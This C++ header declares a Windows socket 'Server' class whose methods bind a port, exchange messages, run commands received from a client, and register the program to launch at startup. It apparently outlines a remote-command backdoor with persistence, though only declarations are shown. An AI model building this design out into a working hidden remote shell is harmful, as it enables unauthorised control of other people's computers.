#ifndef _SERVER_H
#define _SERVER_H

#include <string>

#include <WS2tcpip.h>
#include <winsock.h>
#include <Windows.h>

class Server
{
public:
	Server();
	bool Bind(std::string Port);
	void Start();

	bool SetAsStartup();

	bool Send(std::string Message);
	std::string Receive();

	std::string RunCommand(std::string Input);

	void Shutdown();

private:
	void *GetInAddr(sockaddr *sa);

	int ClientSocket, ServerSocket;
	const static int MaxReceiveLength=100;
};

#endif